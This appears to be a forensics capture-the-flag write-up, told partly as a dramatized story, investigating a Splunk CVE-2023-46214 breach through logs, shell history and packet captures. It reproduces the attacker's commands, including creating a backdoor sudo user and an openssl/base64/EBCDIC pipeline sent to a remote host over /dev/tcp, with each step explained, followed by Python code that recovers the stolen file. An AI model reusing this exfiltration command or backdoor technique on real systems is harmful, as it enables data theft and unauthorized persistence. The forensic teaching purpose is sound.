---
title: "Incident Response"
date: 2024-10-25T13:43:53-06:00
draft: false
image: brand_image.jpg
tags: ["Wireshark", "Openssl"]
series: "Hunting the hunter"
---

- Reading time : "8 min read"

# GETI City Cyber Crisis

## Episode 1: The Breach

---

> _In the heart of Golang Country stands GETI City - a metropolis where technology and ambition touch the sky..._

---

### Scene 1: The City

The winter wind howls through GETI City's glass-and-steel canyons, carrying whispers of digital secrets between towering skyscrapers. Neon signs pierce the darkness, their glow reflecting off the frost-covered windows of Brukley Company's cybersecurity headquarters.

---

### Scene 2: The Alert

```
[CRITICAL ALERT]
Time: 23:47
Location: Brukley Company SOC
Status: ⚠️ SECURITY BREACH DETECTED ⚠️
```

---

### Scene 3: The SOC Room

_The Security Operations Center thrums with tension. Rows of monitors cast an eerie blue glow across worried faces. In the corner, John's workspace has become the epicenter of chaos._

**John** [hands trembling over keyboard]:  
"This isn't normal... The file just... disappeared. Like it was never there."

**Team** [gathering around]:  
_The soft whir of cooling fans is the only sound as they watch John's screen in horrified silence._

---

### Scene 4: The Discovery

**Thomas** [leaning forward, squinting]:  
"Wait. That account... it wasn't there five minutes ago."  
_His finger traces across the screen, pointing to a username that shouldn't exist._

**John**:  
"How did we miss this?"

---

### Scene 5: The Response

**Marcos** [commanding presence, SOC team leader]:  
"Listen up! I want:

- Full network captures
- System logs from the last 48 hours
- Memory dumps from John's machine
- All access logs from the authentication servers

We're not losing this trail."

---

### Scene 6: The Investigation

_Montage sequence:_

- Screens fill with scrolling logs
- USB drives blink frantically
- Network cables snake across desks
- Commands fly across terminals
- Coffee cups multiply

---

### Scene 7: The Call for Help

_The team exchanges knowing looks. There's only one person who can unravel this digital nightmare..._

---

### Scene 8: Enter Mona

_The SOC room door hisses open. A figure stands in the doorway, silhouetted against the hallway lights. Her custom-built laptop glows with a soft, dangerous light._

**Mona** [stepping into the light]:  
"Show me what you've got. And someone better have decent coffee."

_Her fingers hover over her keyboard like a pianist about to begin a symphony of code._

---

## Episode 2: Digital Breadcrumbs

---

### Scene 1: The Analysis Begins

_The SOC room has transformed into Mona's temporary command center. Multiple monitors surround her, each reflecting the blue glow of packet analysis tools._

```
[Network Capture Stats]
Total Packets: 1,427
Time Range: 22:45:16 - 23:47:32
Capture Size: 2.3 MB
```

---

### Scene 2: The Hunt

_Mona's fingers dance across her mechanical keyboard, the clicking sounds rhythmic and purposeful._

**Mona** [muttering to herself]:  
"Let's see what stories these packets can tell..."

_She types her first filter command:_

```wireshark
http || https
```

---

### Scene 3: The Discovery

_The screen refreshes, packets reorganizing themselves like digital playing cards._

**John** [watching over her shoulder]:  
"Thirty packets... out of more than fourteen hundred?"

**Mona**:  
"Sometimes the smallest anomalies tell the biggest stories."

---

### Scene 4: The Splunk Connection

_Mona leans forward, her eyes narrowing at a particular sequence of packets._

```
[Packet Analysis]
Time: 23:15:47
Source: 192.168.1.105
Destination: 10.0.0.15:8000
Protocol: HTTP
```

**Mona** [to herself]:  
"The Splunk web UI connection... something's not right here."

---

### Scene 5: The Pattern

_Multiple screens show different aspects of the same traffic pattern. Mona's face is illuminated by the data scrolling past._

**Marcos**:  
"What are you seeing?"

**Mona** [highlighting sections of the capture]:  
"These request patterns... they're identical to..."
_Her voice trails off as she furiously types._

---

### Scene 6: The Revelation

```
[CRITICAL FINDING]
CVE ID: CVE-2023-46214
Status: CONFIRMED
Severity: CRITICAL
Vector: Splunk Web UI
```

_The room falls silent as the implications sink in._

**Mona** [grimly]:  
"This exploit allows attackers to execute arbitrary commands through the Splunk web interface. Someone knew exactly what they were doing."

---

### Scene 7: The Evidence

_Mona pulls up multiple windows, creating a timeline of the attack:_

```
23:15:47 - Initial connection to Splunk UI
23:15:52 - Malformed request detected
23:16:03 - Unusual response size
23:16:15 - Command injection signature
23:16:30 - File system access attempt
```

**Thomas** [pointing at the screen]:  
"That's exactly when my security alerts started firing!"

---

### Scene 8: The Confirmation

_Mona swivels in her chair to face the team._

**Mona**:  
"We're dealing with someone who knows their CVEs. They exploited a vulnerability that was just published. But they made one mistake..."

_She turns back to her screen, a slight smile playing at the corner of her mouth._

**Mona**:  
"They left breadcrumbs."

---

### Scene 9: The Next Step

_The team clusters around Mona's workspace, the tension palpable._

**Marcos**:  
"What do we do now?"

**Mona** [reaching for her custom USB drive]:  
"Now? We follow the trail. And I know exactly where it leads..."

---

_Technical Notes:_

- CVE-2023-46214 refers to a critical vulnerability in Splunk Enterprise
- The attack pattern shows sophisticated knowledge of Splunk's web interface
- Network capture analysis reveals precise timing of the initial breach

---

# GETI City Cyber Crisis

## Episode 3: The Exploit Chain

---

### Scene 1: The Deep Dive

_Mona's workspace is illuminated by multiple screens, each showing different aspects of the attack. The room is dark except for the blue glow of monitors._

**Mona** [eyes fixed on the central screen]:  
"There you are... I can see your footprints now."

---

### Scene 2: The HTTP Dance

_A terminal window shows scrolling HTTP requests. Mona's fingers tap rhythmically on her desk._

```
[NETWORK TIMELINE]
23:15:47 - POST /en-US/account/login
23:15:52 - Authentication successful
23:16:03 - POST /en-US/splunkd/__upload
```

**John** [leaning in]:  
"What are we looking at?"

**Mona**:  
"The attacker's opening moves. Like a chess game, every piece has its purpose."

---

### Scene 3: The Revelation

_Mona pulls up a split screen showing the malicious payload._

**Mona**:  
"Look at this. They used an XSL file as their weapon of choice. Elegant... and deadly."

```
[MALICIOUS PAYLOAD DETECTED]
Type: XSL Transform
Target: Splunk Enterprise
Severity: Critical
Intent: Remote Code Execution
```

---

### Scene 4: Breaking It Down

_The team gathers around as Mona dissects the attack._

**Mona** [pointing at different sections of code]:  
"Three-step attack chain:

1. Login with stolen credentials
2. Upload weaponized XSL file
3. Trigger the payload"

**Marcos**:  
"But what was their endgame?"

---

### Scene 5: The Master Plan

_Mona's screen fills with decoded commands._

**Mona** [grimly]:  
"They weren't just breaking in... they were moving in."

_She highlights key portions of the decoded payload:_

```
[ATTACKER'S ACTIONS]
✓ Create backdoor user
✓ Grant admin privileges
✓ Plant SSH key
✓ Cover tracks
```

---

### Scene 6: The Pieces Fall Into Place

_Thomas jumps from his chair, recognition dawning on his face._

**Thomas**:  
"The new account I spotted... it wasn't random!"

**Mona** [nodding]:  
"They created a ghost in our machine. A user named 'nginx' hidden in plain sight."

---

### Scene 7: The Tradecraft

_Mona brings up a tactical analysis screen._

**Mona**:  
"This is professional work. They're using techniques straight from the MITRE ATT&CK framework:

- Account Creation
- SSH Hijacking
- Privilege Escalation"

---

### Scene 8: The Smoking Gun

_A decoded base64 string appears on screen._

**Mona** [triumphant]:  
"And here's their mistake. The password they used..."

_She runs a quick decode command:_

```
f8287ec2-3f9a-4a39-9076-36546ebb6a93
```

**Mona**:  
"This isn't random. It's a signature."

---

### Scene 9: The Trail Heats Up

_The team looks at each other as the implications sink in._

**Marcos**:  
"You know who did this?"

**Mona** [closing her laptop]:  
"Better. I know where they're going next. And this time..."
_She pulls out a small device from her coat pocket_
"...we'll be waiting for them."

---

_Technical Notes:_

- Exploit: CVE-2023-46214 (Splunk Enterprise RCE)
- Attack Chain: Authentication → Upload → Code Execution
- Persistence Mechanisms: Account Creation, SSH Key Installation
- MITRE Techniques: T1136, T1203, T1098
-

## Investigation on Server Artefacts

The team has provided artefacts from the compromised server. Below is the directory tree of the compromised machine:

```bash
root
├── boot
├── cdrom
├── dev
├── etc
├── home
├── lost+found
├── media
├── mnt
├── opt
├── proc
├── root
├── run
├── snap
├── srv
├── sys
├── tmp
├── usr
└── var
```

> **Note:** The team also mentioned that John adjusted the timezone without rebooting the system, which has led to inconsistencies with updated or non-updated components. Identifying both the default and the adjusted timezones could aid further in the investigation. What were the default timezone and the timezone after John's adjustment on this machine?

### Timezone Details

Using the following command to investigate timezone settings:

```bash
grep -i "timezone" var/log/syslog
```

The output confirms the timezone change:

```bash
Apr 13 23:24:56 ubuntu dbus-daemon[638]: [system] Activating via systemd: service name='org.freedesktop.timedate1' unit='dbus-org.freedesktop.timedate1.service' requested by ':1.113' (uid=0 pid=5827 comm="timedatectl set-timezone Asia/Ho_Chi_Minh " label="unconfined")
```

- **Adjusted Timezone**: **Asia/Ho_Chi_Minh** (UTC+7)

Further investigation in the `root/var/log/syslog` file reveals the default timezone prior to adjustment:

`````bash
Apr 13 23:21:30 ubuntu gnome-shell[4904]: GNOME Shell started at Sat Apr 13 2024 23:21:22 GMT-0700 (PDT)
````

- **Default Timezone**: **PDT (Pacific Daylight Time)** (UTC-07:00)
---------------
`````

---

## Further Investigation on `auth.log` File

In the `/var/log/auth.log` file, we can trace when the attacker connected via SSH. To do this, we examine log entries related to the `sshd` service:

```bash
cat auth.log | grep -i "sshd"
```

**Sample Output**:

```plaintext
Apr 14 07:58:34 ubuntu useradd[11091]: new user: name=sshd, UID=126, GID=65534, home=/run/sshd, shell=/usr/sbin/nologin, from=none
Apr 14 07:58:34 ubuntu usermod[11099]: change user 'sshd' password
Apr 14 07:58:34 ubuntu chage[11106]: changed password expiry for sshd
Apr 14 08:00:21 ubuntu sshd[13461]: Accepted publickey for nginx from 192.168.222.130 port 43302 ssh2: RSA SHA256:zRdVnxnRPJ37HDm5KkRvQbklvc2PfFL3av8W1Jb6QoE
Apr 14 08:00:21 ubuntu sshd[13461]: pam_unix(sshd:session): session opened for user nginx by (uid=0)
Apr 14 08:03:08 ubuntu sshd[13702]: Received disconnect from 192.168.222.130 port 43302:11: disconnected by user
```

Knowing the timezone, we can convert connection timestamps to UTC.

### Connection Timestamps

- **Original Date and Time**: April 14, 2024, at 08:00:21 PDT
- **Converted to UTC**: April 14, 2024, at 15:00:21 UTC

The final timestamp in `MM-DD hh:mm:ss` format is:
**`04-14 15:00:21`**

### Log Event Analysis

```bash

Apr 14 08:00:13 ubuntu groupadd[13358]: group added to /etc/group: name=nginx, GID=1002
Apr 14 08:00:13 ubuntu groupadd[13358]: group added to /etc/gshadow: name=nginx
Apr 14 08:00:13 ubuntu groupadd[13358]: new group: name=nginx, GID=1002
Apr 14 08:00:13 ubuntu useradd[13364]: new user: name=nginx, UID=1002, GID=1002, home=/var/www/, shell=/bin/bash, from=none
Apr 14 08:00:13 ubuntu usermod[13376]: change user 'nginx' password
Apr 14 08:00:13 ubuntu chfn[13383]: changed user 'nginx' information
Apr 14 08:00:13 ubuntu chpasswd[13394]: pam_unix(chpasswd:chauthtok): password changed for nginx
Apr 14 08:00:13 ubuntu chpasswd[13394]: gkr-pam: couldn't update the login keyring password: no old password was entered
Apr 14 08:00:13 ubuntu usermod[13397]: add 'nginx' to group 'sudo'
Apr 14 08:00:13 ubuntu usermod[13397]: add 'nginx' to shadow group 'sudo'
Apr 14 08:00:21 ubuntu sshd[13461]: Accepted publickey for nginx from 192.168.222.130 port 43302 ssh2: RSA SHA256:zRdVnxnRPJ37HDm5KkRvQbklvc2PfFL3av8W1Jb6QoE
Apr 14 08:00:21 ubuntu sshd[13461]: pam_unix(sshd:session): session opened for user nginx by (uid=0)
Apr 14 08:00:21 ubuntu systemd-logind[673]: New session 7 of user nginx.
Apr 14 08:00:22 ubuntu systemd: pam_unix(systemd-user:session): session opened for user nginx by (uid=0)
Apr 14 08:00:45 ubuntu sudo: pam_unix(sudo:auth): Couldn't open /etc/securetty: No such file or directory
Apr 14 08:00:54 ubuntu sudo: pam_unix(sudo:auth): Couldn't open /etc/securetty: No such file or directory
Apr 14 08:00:54 ubuntu sudo:    nginx : TTY=pts/2 ; PWD=/opt/splunk/bin/scripts ; USER=root ; COMMAND=/usr/bin/rm -rf search.sh
Apr 14 08:00:54 ubuntu sudo: pam_unix(sudo:session): session opened for user root by nginx(uid=0)
Apr 14 08:00:54 ubuntu sudo: pam_unix(sudo:session): session closed for user root
Apr 14 08:00:59 ubuntu sudo:    nginx : TTY=pts/2 ; PWD=/opt/splunk/bin/scripts ; USER=root ; COMMAND=/usr/bin/su
Apr 14 08:00:59 ubuntu sudo: pam_unix(sudo:session): session opened for user root by nginx(uid=0)
Apr 14 08:00:59 ubuntu su: (to root) nginx on pts/2
Apr 14 08:00:59 ubuntu su: pam_unix(su:session): session opened for user root by nginx(uid=0)
Apr 14 08:01:37 ubuntu pkexec: pam_unix(polkit-1:session): session opened for user root by (uid=1000)
Apr 14 08:01:37 ubuntu pkexec[14219]: johnnycage: Executing command [USER=root] [TTY=unknown] [CWD=/home/johnnycage] [COMMAND=/usr/lib/update-notifier/package-system-locked]
Apr 14 08:01:44 ubuntu su: pam_unix(su:session): session closed for user root
Apr 14 08:01:44 ubuntu sudo: pam_unix(sudo:session): session closed for user root
Apr 14 08:02:21 ubuntu sudo:    nginx : TTY=pts/2 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/mv /home/johnnycage/Documents/Important.pdf .
Apr 14 08:02:21 ubuntu sudo: pam_unix(sudo:session): session opened for user root by nginx(uid=0)
Apr 14 08:02:21 ubuntu sudo: pam_unix(sudo:session): session closed for user root
Apr 14 08:02:54 ubuntu sudo:    nginx : TTY=pts/2 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/openssl enc -aes-256-cbc -iv 4fa17640b7dfe8799f072c65b15f581d -K 3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d -in data.zip
Apr 14 08:02:54 ubuntu sudo: pam_unix(sudo:session): session opened for user root by nginx(uid=0)
Apr 14 08:02:54 ubuntu sudo: pam_unix(sudo:session): session closed for user root
Apr 14 08:03:01 ubuntu sudo:    nginx : TTY=pts/2 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/rm -rf data.zip Important.pdf
Apr 14 08:03:01 ubuntu sudo: pam_unix(sudo:session): session opened for user root by nginx(uid=0)
Apr 14 08:03:01 ubuntu sudo: pam_unix(sudo:session): session closed for user root
Apr 14 08:03:08 ubuntu sshd[13702]: Received disconnect from 192.168.222.130 port 43302:11: disconnected by user
Apr 14 08:03:08 ubuntu sshd[13702]: Disconnected from user nginx 192.168.222.130 port 43302
Apr 14 08:03:08 ubuntu sshd[13461]: pam_unix(sshd:session): session closed for user nginx
Apr 14 08:03:08 ubuntu systemd-logind[673]: Session 7 logged out. Waiting for processes to exit.
Apr 14 08:03:08 ubuntu systemd-logind[673]: Removed session 7.

```

### Time Elapsed Between Actions

To calculate the time between the user’s creation and the end of the session:

- **User `nginx` Created**: April 14, 08:00:13
- **SSH Session Ended**: April 14, 08:03:08
- **Elapsed Time**: **00:02:55**

Below is a breakdown of key log entries to understand the attacker’s actions:

1. **`Apr 14 08:00:59 ubuntu su: (to root) nginx on pts/2`**
   - **Timestamp**: April 14, 08:00:59
   - **Event**: The user `nginx` is attempting to switch to the `root` user using the `su` command on the terminal session `pts/2`.
   - **Significance**: This indicates that the `nginx` user is trying to gain superuser privileges.
2. **`Apr 14 08:00:59 ubuntu su: pam_unix(su:session): session opened for user root by nginx(uid=0)`**
   - **Event**: A new session has been opened for the `root` user by `nginx`.
   - **Significance**: The attempt to switch to the `root` user was successful. The UID of `nginx` is 0, which typically indicates that the user has administrative privileges.
3. **`Apr 14 08:01:37 ubuntu pkexec: pam_unix(polkit-1:session): session opened for user root by (uid=1000)`**
   - **Timestamp**: April 14, 08:01:37
   - **Event**: A session has been opened for the `root` user by a user with UID 1000 (most likely a non-root user).
   - **Significance**: This indicates that a user (likely `johnnycage`, based on the next line) executed a command that required elevated privileges using `pkexec`.
4. **`Apr 14 08:01:37 ubuntu pkexec[14219]: johnnycage: Executing command [USER=root] [TTY=unknown] [CWD=/home/johnnycage] [COMMAND=/usr/lib/update-notifier/package-system-locked]`**
   - **Event**: The user `johnnycage` executed a command to run the `package-system-locked` script.
   - **Significance**: This indicates that `johnnycage` was trying to perform an action that required root permissions, possibly to notify about package updates.
5. **`Apr 14 08:01:44 ubuntu su: pam_unix(su:session): session closed for user root`**
   - **Event**: The session for the `root` user has been closed.
   - **Significance**: The `nginx` user has finished the session as `root`.
6. **`Apr 14 08:01:44 ubuntu sudo: pam_unix(sudo:session): session closed for user root`**
   - **Event**: Another session for the `root` user, initiated by `sudo`, has been closed.
   - **Significance**: This confirms that the `root` session associated with `sudo` has also ended.
7. **`Apr 14 08:02:21 ubuntu sudo: nginx : TTY=pts/2 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/mv /home/johnnycage/Documents/Important.pdf .`**
   - **Timestamp**: April 14, 08:02:21
   - **Event**: The `nginx` user is moving a file named `Important.pdf` from `johnnycage`'s Documents folder to the current directory (`/var/www`).
   - **Significance**: This operation indicates file management, possibly for a web application.
8. **`Apr 14 08:02:21 ubuntu sudo: pam_unix(sudo:session): session opened for user root by nginx(uid=0)`**
   - **Event**: A new session has been opened for the `root` user by `nginx` through `sudo`.
   - **Significance**: The `nginx` user has elevated permissions again.
9. **`Apr 14 08:02:21 ubuntu sudo: pam_unix(sudo:session): session closed for user root`**
   - **Event**: The session for the `root` user has been closed.
   - **Significance**: Indicates that the operation initiated by `nginx` has been completed.
10. **`Apr 14 08:02:54 ubuntu sudo: nginx : TTY=pts/2 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/openssl enc -aes-256-cbc -iv 4fa17640b7dfe8799f072c65b15f581d -K 3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d -in data.zip`**
    - **Timestamp**: April 14, 08:02:54
    - **Event**: The `nginx` user is using `openssl` to encrypt a file (`data.zip`) with AES-256-CBC.
    - **Significance**: This operation suggests that the `nginx` user is encrypting sensitive data.
11. **`Apr 14 08:02:54 ubuntu sudo: pam_unix(sudo:session): session opened for user root by nginx(uid=0)`**
    - **Event**: A new session has been opened for the `root` user by `nginx` for this command.
    - **Significance**: Indicates that `nginx` is performing operations with root privileges again.
12. **`Apr 14 08:02:54 ubuntu sudo: pam_unix(sudo:session): session closed for user root`**
    - **Event**: The session for the `root` user has been closed.
    - **Significance**: This indicates the completion of the encryption command.
13. **`Apr 14 08:03:01 ubuntu sudo: nginx : TTY=pts/2 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/rm -rf data.zip Important.pdf`**
    - **Timestamp**: April 14, 08:03:01
    - **Event**: The `nginx` user is removing the original `data.zip` and `Important.pdf` files.
    - **Significance**: This suggests an attempt to cover tracks or remove sensitive files after processing.

### Analysis of `.bash_history` File

The `.bash_history` file in `/var/www/` provides additional insights into the commands the attacker executed:

```bash
whoami
cd /opt/splunk/bin/scripts/
sudo rm -rf search.sh
sudo su
cd /home/johnnycage/
sudo mv /home/johnnycage/Documents/Important.pdf .
zip data.zip *
sudo openssl enc -aes-256-cbc -iv $(cut -c 1-32 <<< $(uname -r | md5sum)) -K $(cut -c 1-64 <<< $(date +%s | sha256sum)) -in data.zip | base64 | dd conv=ebcdic > /dev/tcp/192.168.222.130/8080
sudo rm -rf *
```

From the `.bash_history` and `auth.log`, we observe that the attacker:

1. Accessed elevated privileges using `su` and `sudo`.
2. Moved, encrypted, and attempted to exfiltrate `Important.pdf` to an external server.
3. Cleaned up evidence using `rm` commands on sensitive files.

Finally, using the known `iv` and `key` from point 10 in the logs:

```plaintext
iv 4fa17640b7dfe8799f072c65b15f581d
-K 3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d
```

we can search network traffic to recover the file exfiltrated.

---

## Recovering the Exfiltrated File from Network Traffic

The following command line demonstrates a multi-step operation using several tools—`openssl`, `cut`, `uname`, `md5sum`, `sha256sum`, `date`, `base64`, and `dd`. Here’s a detailed breakdown:

```bash
sudo openssl enc -aes-256-cbc -iv $(cut -c 1-32 <<< $(uname -r | md5sum)) -K $(cut -c 1-64 <<< $(date +%s | sha256sum)) -in data.zip | base64 | dd conv=ebcdic > /dev/tcp/192.168.222.130/8080
```

### Explanation of Each Step

1. **Superuser Privilege**:

   - `sudo`: Runs the command as a superuser, providing necessary permissions for access and encryption.

2. **Encryption with OpenSSL**:

   - `openssl enc -aes-256-cbc`: Encrypts data using the AES-256 algorithm in CBC (Cipher Block Chaining) mode.
   - `-iv $(cut -c 1-32 <<< $(uname -r | md5sum))`: Generates a 32-character (128-bit) initialization vector (IV) for encryption:
     - `uname -r` outputs the kernel version.
     - `md5sum` hashes this kernel version, creating a unique MD5 hash.
     - `cut -c 1-32` extracts the first 32 characters from this hash, producing the IV.
   - `-K $(cut -c 1-64 <<< $(date +%s | sha256sum))`: Specifies the encryption key:
     - `date +%s` outputs the current Unix timestamp (seconds since January 1, 1970).
     - `sha256sum` hashes the timestamp, creating a unique 64-character SHA-256 hash.
     - `cut -c 1-64` takes the full 64 characters, forming a 256-bit encryption key.
   - `-in data.zip`: Specifies `data.zip` as the input file for encryption.

   The result of this part is encrypted data from `data.zip`.

3. **Encoding to Base64**:

   - `| base64`: The pipe `|` passes the encrypted output from `openssl` to `base64`.
   - `base64`: Encodes the encrypted data into Base64, converting binary data into text to facilitate transmission.

4. **Converting to EBCDIC Encoding**:

   - `| dd conv=ebcdic`: The pipe `|` sends the Base64-encoded data to `dd`.
   - `dd conv=ebcdic`: Converts the data from ASCII (default) encoding to EBCDIC (Extended Binary Coded Decimal Interchange Code), a character encoding system typically used on IBM mainframes.

5. **Transmitting Encrypted Data via TCP**:
   - `> /dev/tcp/192.168.222.130/8080`: Redirects the final encrypted, Base64-encoded, and EBCDIC-encoded data to a TCP connection targeting IP address `192.168.222.130` on port `8080`.

## Hunting

This Python script is designed to extract raw TCP data from a pcap file, convert it from EBCDIC to ASCII, decode it from Base64, and decrypt it using OpenSSL.

### Step 1: Extracting Raw TCP Data

The script below reads packets from a specified pcap file, filters them based on IP and port conditions, orders them by TCP sequence, and then assembles the data in the correct sequence.

```python
from scapy.all import rdpcap, TCP, IP, Raw

def extract_tcp_data(pcap_file):
    """Extracts raw data from TCP packets matching filter conditions"""
    packets = rdpcap(pcap_file)
    assembled_data = b""

    print(f"\nAnalyzing {len(packets)} packets from {pcap_file}...")

    # Sort packets by sequence number to ensure correct order
    data_packets = []
    for packet in packets:
        if (packet.haslayer(TCP) and packet.haslayer(IP) and packet.haslayer(Raw) and
            packet[IP].src == '192.168.222.145' and
            packet[TCP].sport == 36568 and
            packet[IP].dst == '192.168.222.130' and
            packet[TCP].dport == 8080):
            data_packets.append(packet)

    # Sort by TCP sequence
    data_packets.sort(key=lambda p: p[TCP].seq)

    # Combine packet data
    for packet in data_packets:
        assembled_data += packet[Raw].load

    return assembled_data
```

### Step 2: Convert from EBCDIC to ASCII

Using IBM's EBCDIC encoding (`cp037`), convert the raw data to ASCII format.

```python
import codecs

ascii_data = codecs.decode(assembled_data, 'cp037')
```

### Step 3: Decode Base64 Data

Next, decode the ASCII data from Base64.

```python
import base64

decoded_data = base64.b64decode(ascii_data)
```

### Step 4: Decrypt with OpenSSL

With known `iv` and `key` values, use OpenSSL to decrypt the file:

```python
import subprocess

iv = "4fa17640b7dfe8799f072c65b15f581d"
key = "3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d"

def decrypt_data():
    cmd = [
        'openssl', 'enc', '-d', '-aes-256-cbc',
        '-iv', iv,
        '-K', key,
        '-in', 'temp_encrypted.bin',
        '-out', 'decrypted.zip'
    ]

    print("\nExecuting OpenSSL command:")
    print(' '.join(cmd))

    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode == 0:
        print("Successfully decrypted to decrypted.zip")
        return True
    else:
        print("Decryption failed:")
        print(result.stderr)
        return False
```

## Unzipping the Decrypted File

After the decryption process, we can unzip `decrypted.zip` to obtain the exfiltrated file. Below is an example of the output generated during the analysis and decryption process:

```
Analyzing 1427 packets from capture.pcapng...
Extracted 103813 bytes of raw data
Converted EBCDIC to ASCII
Decoded Base64 data

Executing OpenSSL command:
openssl enc -d -aes-256-cbc -iv 4fa17640b7dfe8799f072c65b15f581d -K 3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d -in temp_encrypted.bin -out decrypted.zip
Successfully decrypted to decrypted.zip
```

### The Exfiltrated File

You can now access the contents of `decrypted.zip` to retrieve the file that was exfiltrated.

```
unzip decrypted.zip
Archive:  decrypted.zip
  inflating: Important.pdf
```

![Alt text](/images/file_fragility.png "Optional Title")
